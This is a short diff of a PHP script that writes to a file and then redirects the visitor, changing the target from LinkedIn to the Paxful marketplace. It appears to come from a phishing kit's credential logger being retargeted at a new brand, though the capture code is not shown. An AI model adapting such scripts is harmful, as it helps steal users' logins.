@@ -11,6 +11,6 @@ fwrite($handle,"\r\n");
 }
 fwrite($handle,"\r\n");
 fclose($handle);
-header("location:https://www.linkedin.com/");
+header("location:https://www.paxful.com/");
 exit;
 ?>
